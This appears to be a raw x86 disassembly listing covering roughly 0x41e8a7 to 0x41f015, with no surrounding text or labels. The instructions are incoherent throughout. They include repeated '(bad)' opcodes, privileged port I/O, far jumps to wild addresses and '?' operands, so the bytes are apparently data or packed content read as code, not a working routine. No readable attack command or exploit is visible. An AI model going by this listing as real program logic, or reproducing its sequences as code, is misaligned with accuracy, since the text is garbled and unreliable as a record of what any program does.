  41e8a7:	adc    esi,DWORD PTR [ebx+0x7e]
  41e8aa:	daa    
  41e8ab:	jne    0x41e8d8
  41e8ad:	xchg   ebp,eax
  41e8ae:	gs test ebp,edx
  41e8b1:	add    ch,BYTE PTR [esi]
  41e8b3:	outs   dx,DWORD PTR ds:[esi]
  41e8b4:	jb     0x41e8c8
  41e8b6:	mov    BYTE PTR [edi+0x5fd45da3],al
  41e8bc:	test   eax,0x3dec0a10
  41e8c1:	fsub   st,st(3)
  41e8c3:	ins    DWORD PTR es:[edi],dx
  41e8c4:	loop   0x41e8be
  41e8c6:	or     DWORD PTR [ebp-0x16bdbaf8],ecx
  41e8cc:	mov    edi,0xcf8f9b53
  41e8d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8d2:	cmp    al,0x9e
  41e8d4:	and    ebx,DWORD PTR [ebx]
  41e8d6:	in     eax,dx
  41e8d7:	imul   esp,DWORD PTR [edi+0x20],0xffffffce
  41e8db:	add    BYTE PTR [ecx+0x65],ch
  41e8de:	cli    
  41e8df:	cmp    DWORD PTR [edi-0x5894b5ed],ecx
  41e8e5:	dec    DWORD PTR [esi]
  41e8e7:	popa   
  41e8e8:	in     eax,0xae
  41e8ea:	shr    esi,0x8c
  41e8ed:	xor    edx,DWORD PTR [ebx+0x2815531b]
  41e8f3:	xlat   BYTE PTR ds:[ebx]
  41e8f4:	jno    0x41e883
  41e8f6:	push   esp
  41e8f7:	mov    DWORD PTR ds:0x3e4a0111,esp
  41e8fd:	outs   dx,BYTE PTR ds:[esi]
  41e8fe:	test   eax,0x56a21000
  41e903:	mov    ecx,0xd31a3f66
  41e908:	dec    ecx
  41e909:	fld    TBYTE PTR ds:0x4d5a12cc
  41e90f:	cld    
  41e910:	ds and al,0x3e
  41e913:	and    al,0xc9
  41e915:	pop    ecx
  41e916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e917:	inc    ecx
  41e918:	mov    bh,0x9e
  41e91a:	repnz or DWORD PTR [ebx+eiz*8],0xe6c789af
  41e922:	xchg   ecx,eax
  41e923:	dec    edx
  41e924:	aam    0xf0
  41e926:	fidivr WORD PTR [edi-0x4e]
  41e929:	loop   0x41e92e
  41e92b:	inc    esp
  41e92c:	or     DWORD PTR ds:0xcbca6fb9,edx
  41e932:	retf   
  41e933:	not    DWORD PTR [edx+eax*4-0x297470cd]
  41e93a:	jecxz  0x41e96c
  41e93c:	and    al,0xc2
  41e93e:	and    BYTE PTR [eax],al
  41e940:	pushw  ds
  41e942:	aas    
  41e943:	clc    
  41e944:	mov    WORD PTR [ecx],fs
  41e946:	jnp    0x41e8cc
  41e948:	xor    al,BYTE PTR [edx+0x274f6a2f]
  41e94e:	int3   
  41e94f:	int3   
  41e950:	push   ecx
  41e951:	int    0xa
  41e953:	jns    0x41e98b
  41e955:	xchg   esi,eax
  41e956:	popa   
  41e957:	repnz sahf 
  41e959:	popa   
  41e95a:	int    0x87
  41e95c:	loop   0x41e9d5
  41e95e:	retf   
  41e95f:	loopne 0x41e8f3
  41e961:	movnti DWORD PTR [ecx+0x6f],ebx
  41e965:	fnstcw WORD PTR [edx+0x54]
  41e968:	or     DWORD PTR [edx],0x39b55ca4
  41e96e:	push   es
  41e96f:	jle    0x41e93d
  41e971:	mov    cl,0xc3
  41e973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e974:	mov    WORD PTR [edx-0x4cba4f87],gs
  41e97a:	pusha  
  41e97b:	(bad)  
  41e97c:	mov    ecx,ebp
  41e97e:	mov    DWORD PTR [ecx],ebp
  41e980:	fild   WORD PTR [edx+0x65]
  41e983:	add    BYTE PTR [ecx],dl
  41e985:	into   
  41e986:	add    BYTE PTR [edx],0x1a
  41e989:	or     edx,DWORD PTR [edi+0x166b74cf]
  41e98f:	in     eax,0xb6
  41e991:	mov    bl,BYTE PTR [eax]
  41e993:	aam    0xa
  41e995:	test   DWORD PTR [ebx+0x2a],ebx
  41e998:	xchg   edx,eax
  41e999:	adc    al,0xaa
  41e99b:	repnz retf 
  41e99d:	dec    ebp
  41e99e:	sbb    al,0x23
  41e9a0:	retf   
  41e9a1:	add    edx,esp
  41e9a3:	cmp    esi,DWORD PTR [esi-0xb]
  41e9a6:	(bad)  
  41e9a7:	mov    dh,0x71
  41e9a9:	jle    0x41ea06
  41e9ab:	inc    edx
  41e9ac:	push   ss
  41e9ad:	clc    
  41e9ae:	arpl   WORD PTR [edi+0xd],bp
  41e9b1:	cmp    DWORD PTR gs:[ecx],ebp
  41e9b4:	cli    
  41e9b5:	fnstcw WORD PTR [ebx]
  41e9b7:	retf   
  41e9b8:	lea    eax,[esi+0x77]
  41e9bb:	ror    bl,0xb4
  41e9be:	xor    BYTE PTR ds:0x17069872,ch
  41e9c4:	cmc    
  41e9c5:	int3   
  41e9c6:	fst    QWORD PTR [ecx-0x24da4ddd]
  41e9cc:	or     edx,DWORD PTR [esi+0x71]
  41e9cf:	jae    0x41e989
  41e9d1:	mov    ch,0x9c
  41e9d3:	add    bl,BYTE PTR [edi-0x9]
  41e9d6:	ret    
  41e9d7:	cmp    ebp,edi
  41e9d9:	rcl    DWORD PTR [edi],cl
  41e9db:	in     eax,0x3f
  41e9dd:	fst    DWORD PTR [eax+0x542dd0f]
  41e9e3:	lahf   
  41e9e4:	pop    ds
  41e9e5:	mov    esi,0x2994af15
  41e9ea:	fdivr  QWORD PTR [eax+0x3b]
  41e9ed:	repz fld st(3)
  41e9f0:	iret   
  41e9f1:	fidiv  DWORD PTR [edx]
  41e9f3:	jno    0x41e9b9
  41e9f5:	push   edx
  41e9f6:	paddd  mm2,mm2
  41e9f9:	sub    DWORD PTR [edx-0x64],esi
  41e9fc:	call   0xe62f543c
  41ea01:	(bad)  
  41ea02:	shl    ebp,cl
  41ea04:	xor    BYTE PTR [edx+ecx*2+0x48],ch
  41ea08:	pusha  
  41ea09:	xor    al,0x18
  41ea0b:	popf   
  41ea0c:	mov    edx,0x901ffe5a
  41ea11:	les    esp,FWORD PTR [edx]
  41ea13:	add    BYTE PTR [ebx],bl
  41ea15:	add    eax,0x80ad49fb
  41ea1a:	repnz inc edx
  41ea1c:	gs fwait
  41ea1e:	jp     0x41ea7b
  41ea20:	mov    cl,0xde
  41ea22:	adc    bh,BYTE PTR [edi+eax*4]
  41ea25:	jmp    0xaef34cca
  41ea2a:	add    al,BYTE PTR [edi+0xe]
  41ea2d:	scas   al,BYTE PTR es:[edi]
  41ea2e:	mul    esi
  41ea30:	cli    
  41ea31:	adc    al,0xc2
  41ea33:	xor    eax,0xbef206a8
  41ea38:	inc    eax
  41ea39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea3a:	push   0xffffffe3
  41ea3c:	out    dx,al
  41ea3d:	xchg   edi,edi
  41ea3f:	adc    eax,0xb84ac958
  41ea44:	inc    ecx
  41ea45:	jne    0x41ea8c
  41ea47:	push   eax
  41ea48:	inc    edi
  41ea49:	mov    edx,0x8449c3ef
  41ea4e:	mov    cl,0x30
  41ea50:	add    al,0x3d
  41ea52:	fisttp QWORD PTR [eax+edi*2-0x24]
  41ea56:	xor    edx,DWORD PTR ds:0xed52e205
  41ea5c:	adc    bl,BYTE PTR ds:0x40934e40
  41ea62:	in     al,0xd1
  41ea64:	cdq    
  41ea65:	inc    eax
  41ea66:	mov    al,ds:0x5950ed73
  41ea6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6c:	fisttp DWORD PTR [edi+0x7261d35d]
  41ea72:	popa   
  41ea73:	xchg   eax,esp
  41ea75:	stos   DWORD PTR es:[edi],eax
  41ea76:	test   ecx,ebx
  41ea78:	jo     0x41ea6a
  41ea7a:	fisttp QWORD PTR es:[eax+0x48fe9d33]
  41ea81:	scas   al,BYTE PTR es:[edi]
  41ea82:	push   ss
  41ea83:	mov    ss,WORD PTR [ecx+esi*2-0x4d68e9d7]
  41ea8a:	push   esi
  41ea8b:	or     esi,DWORD PTR [edx+0x4ba85853]
  41ea91:	sub    DWORD PTR [eax-0x23329f63],ebp
  41ea97:	dec    eax
  41ea98:	sahf   
  41ea99:	xor    cl,0xe5
  41ea9c:	and    eax,0x88af5e57
  41eaa1:	mov    eax,edi
  41eaa3:	sbb    bl,BYTE PTR [ebx+esi*2+0x7d]
  41eaa7:	sub    DWORD PTR [eax],ecx
  41eaa9:	cld    
  41eaaa:	adc    DWORD PTR [esi+0x7d1e4a31],edi
  41eab0:	jecxz  0x41ea63
  41eab2:	jmp    FWORD PTR [edx*4-0xe73ae4b]
  41eab9:	add    dl,BYTE PTR [esi+ebp*4]
  41eabc:	and    eax,0xc16da693
  41eac1:	arpl   WORD PTR [ebp+0x3b],si
  41eac4:	add    al,0x9
  41eac6:	rcr    DWORD PTR [edx-0x346d5586],cl
  41eacc:	and    DWORD PTR ds:0x9bf634b7,esi
  41ead2:	ret    0xc01d
  41ead5:	push   edx
  41ead6:	paddusb mm4,QWORD PTR ds:0x2508c577
  41eadd:	repnz fsub QWORD PTR [esi]
  41eae0:	int3   
  41eae1:	pop    eax
  41eae2:	ret    0x4405
  41eae5:	mov    ds:0xd8b801f5,eax
  41eaea:	push   0xfffffffb
  41eaec:	test   al,0x19
  41eaee:	push   edx
  41eaef:	in     eax,0x2e
  41eaf1:	sub    DWORD PTR [esp+esi*1],eax
  41eaf4:	adc    al,0x75
  41eaf6:	lea    ecx,[ebx+0x57d0989b]
  41eafc:	imul   ebp,DWORD PTR [edi],0xffffffba
  41eaff:	ror    DWORD PTR [ebx],1
  41eb01:	mov    ?,WORD PTR [ebx+0x18]
  41eb04:	mov    edi,0x6a0d8e6f
  41eb09:	mul    DWORD PTR [esi-0x16]
  41eb0c:	or     esp,esp
  41eb0e:	inc    ecx
  41eb0f:	pop    es
  41eb10:	pop    ebx
  41eb11:	std    
  41eb12:	or     eax,0x5c71b97f
  41eb17:	xchg   DWORD PTR [eax-0x5d],ebx
  41eb1a:	and    esp,DWORD PTR [ecx]
  41eb1c:	push   edi
  41eb1d:	add    dh,BYTE PTR [esp+edx*2]
  41eb20:	es xor esp,eax
  41eb23:	loope  0x41eb32
  41eb25:	jmp    0x2f06:0xb400d640
  41eb2c:	add    DWORD PTR [esi+0x2f],edi
  41eb2f:	add    eax,0xa0c2809e
  41eb34:	cmp    eax,esi
  41eb36:	push   edx
  41eb37:	jl     0x41eba9
  41eb39:	aaa    
  41eb3a:	push   esi
  41eb3b:	idiv   BYTE PTR [ebx+0x59]
  41eb3e:	xchg   BYTE PTR [esi],ah
  41eb40:	ret    
  41eb41:	push   edx
  41eb42:	rol    BYTE PTR [eax-0x2eff7aea],0x20
  41eb49:	mov    edx,0x754fea5b
  41eb4e:	fist   DWORD PTR [eax]
  41eb50:	adc    al,0xd2
  41eb52:	jle    0x41ebd1
  41eb54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb55:	icebp  
  41eb56:	adc    BYTE PTR [ecx-0x5106f683],0x2f
  41eb5d:	adc    ebx,esi
  41eb5f:	pop    ebx
  41eb60:	test   al,0xb0
  41eb63:	pop    ecx
  41eb64:	jge    0x41eb9c
  41eb66:	ret    
  41eb67:	cld    
  41eb68:	mov    bh,0x23
  41eb6a:	bound  ebx,QWORD PTR [edx+0x1e791780]
  41eb70:	cld    
  41eb71:	clc    
  41eb72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb73:	ret    0xeaa6
  41eb76:	xor    al,cl
  41eb78:	sbb    ebx,DWORD PTR [edi]
  41eb7a:	shr    DWORD PTR [edi+0x15],0x2c
  41eb7e:	pop    ebp
  41eb7f:	repnz and al,0x3b
  41eb82:	jle    0x41ebb6
  41eb84:	inc    esi
  41eb85:	pavgb  mm2,QWORD PTR [esi+0x74a50be6]
  41eb8c:	pusha  
  41eb8d:	in     al,0x91
  41eb8f:	adc    dh,BYTE PTR [edi]
  41eb91:	or     DWORD PTR [esi+0x3c],edi
  41eb94:	retf   
  41eb95:	xor    esi,DWORD PTR [esi-0x6a]
  41eb98:	ret    0xc114
  41eb9b:	cmp    edi,esp
  41eb9d:	push   ebp
  41eb9e:	mov    ecx,0x1cd200f4
  41eba3:	dec    ebx
  41eba4:	xchg   DWORD PTR [eax-0x7e19c85f],edx
  41ebaa:	jle    0x41ebb4
  41ebac:	xlat   BYTE PTR ds:[ebx]
  41ebad:	call   0x5634:0xb9d0e01a
  41ebb4:	sub    eax,0xa4deec88
  41ebb9:	sbb    eax,0x2c817ba8
  41ebbe:	imul   esi,DWORD PTR [esi+0x934c2d3],0x4e6d4d01
  41ebc8:	sub    DWORD PTR [edx+0x17],esi
  41ebcb:	sbb    dh,BYTE PTR [edx-0x73]
  41ebce:	adc    eax,0x15e0b16a
  41ebd3:	rcl    BYTE PTR [edx-0x5b],1
  41ebd6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41ebd8:	aas    
  41ebd9:	cli    
  41ebda:	dec    dx
  41ebdc:	mov    cl,0x54
  41ebde:	jle    0x41ec0b
  41ebe0:	sub    BYTE PTR [edx+0x46],ah
  41ebe3:	mov    ebx,0xe201985
  41ebe8:	rcr    cl,1
  41ebea:	fcom   DWORD PTR [edi+0x17]
  41ebed:	mov    ?,ecx
  41ebef:	mov    ecx,0x4cbb60cf
  41ebf4:	aaa    
  41ebf5:	jecxz  0x41ebf4
  41ebf7:	mov    eax,0x8db3776c
  41ebfc:	aaa    
  41ebfd:	dec    edi
  41ebfe:	stos   BYTE PTR es:[edi],al
  41ebff:	sub    edx,ebx
  41ec01:	test   BYTE PTR [ebx],cl
  41ec03:	add    BYTE PTR [eax+0x688bb66c],ah
  41ec09:	or     BYTE PTR [edx+0x2473b41d],bl
  41ec0f:	test   BYTE PTR [eax],ah
  41ec11:	test   eax,0x63ce9097
  41ec16:	daa    
  41ec17:	xor    esi,DWORD PTR [edx-0x19]
  41ec1a:	loop   0x41ec48
  41ec1c:	mov    ?,edi
  41ec1e:	daa    
  41ec1f:	add    bh,BYTE PTR [ecx+0x13]
  41ec22:	outs   dx,BYTE PTR ds:[esi]
  41ec23:	jl     0x41ebaf
  41ec25:	sti    
  41ec26:	or     BYTE PTR [edx-0x32],0xc
  41ec2a:	jmp    0x291cbdda
  41ec2f:	mov    eax,0xdd5dd14a
  41ec34:	inc    ebx
  41ec35:	or     DWORD PTR [eax-0x4e83ddad],ebx
  41ec3b:	pop    edx
  41ec3c:	(bad)  
  41ec3d:	adc    eax,0x45ed925f
  41ec42:	cld    
  41ec43:	rcr    DWORD PTR [edx],cl
  41ec45:	inc    esi
  41ec46:	inc    edi
  41ec47:	call   0x4a5b1b7c
  41ec4c:	push   0xffffffb1
  41ec4e:	stc    
  41ec4f:	or     bl,BYTE PTR [ebp-0x6b]
  41ec52:	pop    ebx
  41ec53:	xor    DWORD PTR [esi-0x6ba6fe2],ecx
  41ec59:	mov    WORD PTR [edi+0x48986835],ss
  41ec5f:	cmp    cl,BYTE PTR [esi-0x7b962f6f]
  41ec65:	sub    al,0x1f
  41ec67:	jg     0x41ec84
  41ec69:	in     eax,0xa2
  41ec6b:	adc    al,0x55
  41ec6d:	xchg   eax,ebp
  41ec6f:	or     DWORD PTR [edx-0x28],0x70c91a29
  41ec76:	sub    edx,DWORD PTR [eax-0x4f]
  41ec79:	adc    DWORD PTR [eax+0x14],edi
  41ec7c:	(bad)  
  41ec7d:	jb     0x41ec60
  41ec7f:	and    ebx,DWORD PTR [edi+0x48]
  41ec82:	sbb    edi,esp
  41ec84:	inc    edi
  41ec85:	std    
  41ec86:	(bad)  
  41ec87:	xor    BYTE PTR [edx+0x52bf6d46],dh
  41ec8d:	std    
  41ec8e:	in     al,0xc7
  41ec90:	jno    0x41ec61
  41ec92:	test   eax,0x73ee844e
  41ec97:	lods   eax,DWORD PTR ds:[esi]
  41ec98:	pop    eax
  41ec99:	xchg   edi,eax
  41ec9a:	inc    ecx
  41ec9b:	enter  0xb6f,0x6a
  41ec9f:	jno    0x41ec2d
  41eca1:	fbstp  TBYTE PTR [edi*1-0x1fad4feb]
  41eca8:	jae    0x41ecf4
  41ecaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecab:	mov    eax,edx
  41ecad:	xchg   ecx,eax
  41ecae:	dec    eax
  41ecaf:	mov    ds:0x699dc7ea,al
  41ecb4:	mov    BYTE PTR [edx-0x6d],al
  41ecb7:	push   cs
  41ecb8:	in     eax,0x86
  41ecba:	sbb    DWORD PTR [edi+0x40],esi
  41ecbd:	fnstsw WORD PTR [ebp+0x2e]
  41ecc0:	pop    esi
  41ecc1:	jbe    0x41ec93
  41ecc3:	pop    esi
  41ecc4:	rcl    BYTE PTR [esi-0x11280159],1
  41ecca:	retf   0xf904
  41eccd:	lds    ebx,FWORD PTR ds:0xd8eb9cbe
  41ecd3:	add    eax,0x931db94d
  41ecd8:	pop    ss
  41ecd9:	enter  0xa2f5,0x66
  41ecdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecde:	push   esi
  41ecdf:	sbb    cl,BYTE PTR ds:0xf33036a1
  41ece5:	push   esi
  41ece6:	(bad)  
  41ece7:	jo     0x41eceb
  41ece9:	and    al,0xf4
  41eceb:	ja     0x41ec7a
  41eced:	out    dx,eax
  41ecee:	fbld   TBYTE PTR [eax+0x5c179104]
  41ecf4:	or     ebp,ecx
  41ecf6:	jp     0x41ecf7
  41ecf8:	add    al,0xcc
  41ecfa:	scas   al,BYTE PTR es:[edi]
  41ecfb:	xlat   BYTE PTR ds:[ebx]
  41ecfc:	mov    ds:0x35532618,eax
  41ed01:	shl    BYTE PTR [eax+0x3e],1
  41ed04:	push   ds
  41ed05:	mov    ch,0x86
  41ed07:	push   esi
  41ed08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed09:	cmp    esi,edx
  41ed0b:	fisub  WORD PTR [edi-0x1]
  41ed0e:	mov    ecx,0xd7d66709
  41ed13:	push   0x6d
  41ed15:	xor    dl,cl
  41ed17:	stos   BYTE PTR es:[edi],al
  41ed18:	pop    ebp
  41ed19:	les    edi,FWORD PTR [ecx-0x3f027d80]
  41ed1f:	pop    esp
  41ed20:	out    dx,al
  41ed21:	popa   
  41ed22:	push   ebp
  41ed23:	fsubr  DWORD PTR [esi-0x52]
  41ed26:	fimul  WORD PTR [ebx]
  41ed28:	inc    eax
  41ed29:	mov    ebx,DWORD PTR [ecx+0x1b]
  41ed2c:	inc    edx
  41ed2d:	sbb    eax,0x59f8bc92
  41ed32:	icebp  
  41ed33:	fwait
  41ed34:	je     0x41ed4e
  41ed36:	xchg   esi,eax
  41ed37:	mov    WORD PTR [eax-0x5],?
  41ed3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed3b:	js     0x41ed6c
  41ed3d:	mov    cl,bl
  41ed3f:	mov    ecx,0xe519a6b9
  41ed44:	push   ecx
  41ed45:	fidivr DWORD PTR [esp+esi*4]
  41ed48:	jbe    0x41ed3d
  41ed4a:	jp     0x41ed55
  41ed4c:	aad    0x29
  41ed4e:	dec    ecx
  41ed4f:	adc    edi,DWORD PTR [edi+0x14]
  41ed52:	pop    ebx
  41ed53:	bound  ecx,QWORD PTR [esi-0x140f4d8]
  41ed59:	in     eax,0x41
  41ed5b:	nop    DWORD PTR [esi]
  41ed5e:	adc    DWORD PTR [eax+ebp*4],0xffffffd7
  41ed62:	sub    DWORD PTR [ebp+edx*8-0x7d4ec6f9],esi
  41ed69:	cmp    BYTE PTR [ebx-0x51],cl
  41ed6c:	repnz int3 
  41ed6e:	ds mov edx,0xad864ae6
  41ed74:	push   ebx
  41ed75:	jmp    edi
  41ed77:	xchg   edx,eax
  41ed78:	stc    
  41ed79:	xor    DWORD PTR [esi+ebp*8-0x56a69cf8],ecx
  41ed80:	xor    DWORD PTR [edx],esi
  41ed82:	test   DWORD PTR [eax+0x3b],0xe3443709
  41ed89:	in     al,dx
  41ed8a:	jle    0x41ed88
  41ed8c:	test   eax,0x5d4527da
  41ed91:	test   eax,0x1b2ddebe
  41ed96:	push   ecx
  41ed97:	xor    DWORD PTR [eax+0x28],esp
  41ed9a:	sbb    eax,0x36a14769
  41ed9f:	enter  0xa66,0xb
  41eda3:	dec    edx
  41eda4:	xchg   edx,eax
  41eda5:	das    
  41eda6:	in     eax,dx
  41eda7:	adc    DWORD PTR [eax],edi
  41eda9:	sub    DWORD PTR [edx+0x4358886c],0xffffffe7
  41edb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb1:	pop    esi
  41edb2:	fucomi st,st(3)
  41edb4:	fs sbb al,0xc6
  41edb7:	loope  0x41eddf
  41edb9:	ror    BYTE PTR [ebp+0x510eeda2],cl
  41edbf:	(bad)  
  41edc1:	ins    BYTE PTR es:[edi],dx
  41edc2:	xor    al,0x5b
  41edc4:	xor    ebp,DWORD PTR ds:0x5440f5a5
  41edca:	pop    ebp
  41edcb:	addr16 ret 
  41edcd:	out    0x3c,al
  41edcf:	mov    ah,0x1a
  41edd1:	pop    edi
  41edd2:	ds push eax
  41edd4:	loope  0x41edb5
  41edd6:	pop    edx
  41edd7:	add    dh,BYTE PTR [ebx-0x70]
  41edda:	sti    
  41eddb:	arpl   si,bp
  41eddd:	out    0xf0,eax
  41eddf:	loop   0x41ede4
  41ede1:	(bad)  
  41ede2:	icebp  
  41ede3:	adc    BYTE PTR [ecx],ah
  41ede5:	sub    al,0x3c
  41ede7:	jmp    0xf86cda95
  41edec:	call   0x5c0fd5f2
  41edf1:	shr    DWORD PTR [edi+0xa],0xae
  41edf5:	jge    0x41ee70
  41edf7:	push   esi
  41edf8:	ds js  0x41ee4a
  41edfb:	inc    ebx
  41edfc:	or     bh,BYTE PTR [ebp+0x6d]
  41edff:	fwait
  41ee00:	test   BYTE PTR es:[eax-0x714e3eb9],dh
  41ee07:	lods   al,BYTE PTR ds:[esi]
  41ee08:	je     0x41ee0c
  41ee0a:	enter  0x3c51,0x6b
  41ee0e:	pop    ebx
  41ee0f:	aam    0x19
  41ee11:	pop    ss
  41ee12:	(bad)  
  41ee13:	outs   dx,BYTE PTR ds:[esi]
  41ee14:	mov    esi,0xe2aed3fd
  41ee19:	(bad)  
  41ee1a:	jle    0x41edbf
  41ee1c:	repz inc edi
  41ee1e:	jmp    0xda1e11c1
  41ee23:	daa    
  41ee24:	fwait
  41ee25:	or     eax,0xa0df1162
  41ee2a:	jne    0x41ee27
  41ee2c:	push   eax
  41ee2d:	mov    eax,0x675309b1
  41ee32:	xchg   ebp,eax
  41ee33:	inc    edx
  41ee34:	sub    DWORD PTR [edi-0x11],esi
  41ee37:	sar    BYTE PTR [eax+0x379825c9],cl
  41ee3d:	ficom  WORD PTR [eax]
  41ee3f:	cld    
  41ee40:	lods   eax,DWORD PTR ds:[esi]
  41ee41:	shr    BYTE PTR [edx-0x2],1
  41ee44:	in     eax,0x53
  41ee46:	ret    0x598e
  41ee49:	aas    
  41ee4a:	sbb    ah,BYTE PTR [ecx+esi*1]
  41ee4d:	retf   0xd785
  41ee50:	mov    dh,0x1f
  41ee52:	and    DWORD PTR [edx+0x46],esp
  41ee55:	cwde   
  41ee56:	dec    ebp
  41ee57:	adc    eax,0xa917624f
  41ee5c:	ret    
  41ee5d:	in     eax,0x14
  41ee5f:	fcmovu st,st(1)
  41ee61:	jmp    0xdadf:0x4f28df54
  41ee68:	fnstenv [ebx+0x6e]
  41ee6b:	jg     0x41ee81
  41ee6d:	int3   
  41ee6e:	pop    ebx
  41ee6f:	push   0x5c
  41ee71:	rcl    BYTE PTR [ebx],cl
  41ee73:	xchg   esi,eax
  41ee74:	mov    WORD PTR [edx+0x20b70d2d],ds
  41ee7a:	jmp    0x3b68f65c
  41ee7f:	mov    ah,0x70
  41ee81:	rol    DWORD PTR [eax-0x12d5cbda],0x41
  41ee88:	jp     0x41eec3
  41ee8a:	xor    BYTE PTR [ebx+0x38606294],0x3a
  41ee91:	inc    ebx
  41ee92:	fiadd  DWORD PTR [esi]
  41ee94:	adc    bl,BYTE PTR [edx+0x65]
  41ee97:	out    0x7c,eax
  41ee99:	retf   
  41ee9a:	pop    ebx
  41ee9b:	jmp    0x31147027
  41eea0:	call   0xa8d2303a
  41eea5:	add    bl,cl
  41eea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eea8:	push   ecx
  41eea9:	idiv   BYTE PTR [edi]
  41eeab:	mov    esi,0x3b63878b
  41eeb0:	adc    eax,0x936bd27e
  41eeb5:	push   ebx
  41eeb6:	iret   
  41eeb7:	mov    al,ch
  41eeb9:	jno    0x41eeaa
  41eebb:	xchg   ecx,eax
  41eebc:	or     BYTE PTR [eax-0x635ae03d],ah
  41eec2:	xlat   BYTE PTR ds:[ebx]
  41eec3:	lea    ecx,[ebx-0x7b807d1d]
  41eec9:	addr16 clc 
  41eecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eecc:	jno    0x41ee9f
  41eece:	or     dl,BYTE PTR ds:0x4d95349
  41eed4:	pop    ds
  41eed5:	sub    BYTE PTR [ebp+0x6e],0xa7
  41eed9:	(bad)  
  41eedb:	in     al,0x3a
  41eedd:	mov    eax,0x8e8d050c
  41eee2:	ins    BYTE PTR es:[edi],dx
  41eee3:	mov    esi,0x89329655
  41eee8:	or     DWORD PTR [eax],0xd066a11f
  41eeee:	aam    0x77
  41eef0:	push   es
  41eef1:	dec    ebx
  41eef2:	aad    0xef
  41eef4:	jl     0x41eefa
  41eef6:	loope  0x41ef4b
  41eef8:	push   edi
  41eef9:	mov    esp,0x5984ce84
  41eefe:	in     al,dx
  41eeff:	xor    DWORD PTR ds:0x3010a89c,0x2b
  41ef06:	inc    ebx
  41ef07:	mov    ah,0xd6
  41ef09:	mov    bh,0x6b
  41ef0b:	shl    dh,1
  41ef0d:	mov    ch,0x42
  41ef0f:	std    
  41ef10:	pop    edx
  41ef11:	lods   al,BYTE PTR ds:[esi]
  41ef12:	cs mov esi,0x19e91bc0
  41ef18:	cmp    bh,BYTE PTR [edi+0x57e96fe8]
  41ef1e:	(bad)  
  41ef1f:	in     eax,dx
  41ef20:	xor    ebx,0x2
  41ef23:	gs (bad) 
  41ef25:	out    0x7,al
  41ef27:	mov    bh,0x4c
  41ef29:	stc    
  41ef2a:	sub    eax,0xa51f4937
  41ef2f:	in     al,0x29
  41ef31:	xlat   BYTE PTR ds:[ebx]
  41ef32:	xor    BYTE PTR [edx+0x893cad9],cl
  41ef38:	mov    cl,0x2e
  41ef3a:	mov    eax,0x1b994a0d
  41ef3f:	pop    edi
  41ef40:	sub    DWORD PTR [esi],edi
  41ef42:	sub    al,0xf5
  41ef44:	aad    0xda
  41ef46:	and    esi,esp
  41ef48:	xor    dh,BYTE PTR es:[edx+ebp*4+0x1474e99c]
  41ef50:	add    eax,0x10c38236
  41ef55:	sbb    dl,BYTE PTR [ebx-0x2997f1d1]
  41ef5b:	bound  eax,QWORD PTR [eax]
  41ef5d:	cmp    DWORD PTR [ebp-0x3a],ebp
  41ef60:	xor    cl,BYTE PTR [ecx]
  41ef62:	in     al,dx
  41ef63:	inc    eax
  41ef64:	push   cs
  41ef65:	xchg   ebx,eax
  41ef66:	push   ss
  41ef67:	mov    bl,0xf0
  41ef69:	dec    edi
  41ef6a:	cmc    
  41ef6b:	and    eax,0x40e818aa
  41ef70:	xchg   esp,eax
  41ef71:	add    al,0xf6
  41ef73:	jns    0x41ef35
  41ef75:	ror    BYTE PTR [ebp-0x7f1db58d],cl
  41ef7b:	add    dl,BYTE PTR [ecx]
  41ef7d:	mov    al,0xde
  41ef7f:	inc    esi
  41ef80:	loopne 0x41ef5e
  41ef82:	mov    ch,bl
  41ef84:	(bad)  
  41ef85:	mov    bl,0xcd
  41ef87:	dec    ecx
  41ef88:	(bad)  [edi+eax*8-0x30dc946]
  41ef8f:	imul   ebx,DWORD PTR [edi],0xe75fa3e4
  41ef95:	mov    ds:0x6746aa73,eax
  41ef9a:	mov    ecx,0x3af04417
  41ef9f:	mov    edx,0x8725dcde
  41efa4:	push   eax
  41efa5:	mov    edx,0xd945c55c
  41efaa:	adc    edi,DWORD PTR [esp+edi*4+0x78537858]
  41efb1:	jmp    0x41efa5
  41efb3:	or     al,0x57
  41efb5:	rcl    DWORD PTR [eax-0x19],1
  41efb8:	inc    esi
  41efb9:	push   0x3f3959fb
  41efbe:	and    al,0xe2
  41efc0:	inc    esi
  41efc1:	dec    edx
  41efc2:	aaa    
  41efc3:	pop    esp
  41efc4:	pushf  
  41efc5:	sbb    bh,ch
  41efc7:	mov    esp,0x21fbb055
  41efcc:	(bad)  
  41efcd:	out    0xe1,al
  41efcf:	(bad)  
  41efd0:	repnz adc BYTE PTR [esi],ah
  41efd3:	shl    BYTE PTR [eax+0x6616014],1
  41efd9:	rcr    BYTE PTR [ecx+0x2a],0x8e
  41efdd:	arpl   ax,bp
  41efdf:	mov    eax,0x6bb197df
  41efe4:	ja     0x41f054
  41efe6:	mov    ds:0xa0164071,al
  41efeb:	mov    eax,ds:0xdfb057c6
  41eff0:	mov    esp,DWORD PTR [eax]
  41eff2:	and    dl,ah
  41eff4:	dec    DWORD PTR [edx]
  41eff6:	fdivrp st(2),st
  41eff8:	push   eax
  41eff9:	jg     0x41f000
  41effb:	out    0x7d,eax
  41effd:	psrld  mm4,mm4
  41f000:	cmp    DWORD PTR [ecx],0x4
  41f003:	out    0xbd,eax
  41f005:	xchg   edx,eax
  41f006:	push   cs
  41f007:	add    cl,BYTE PTR ds:0x6992045a
  41f00d:	push   es
  41f00e:	push   ss
  41f00f:	dec    ebx
  41f010:	cwde   
  41f011:	cmp    BYTE PTR [edi],0xba
  41f014:	xchg   ecx,eax
  41f015:	cmp    BYTE PTR [edi],0xa1
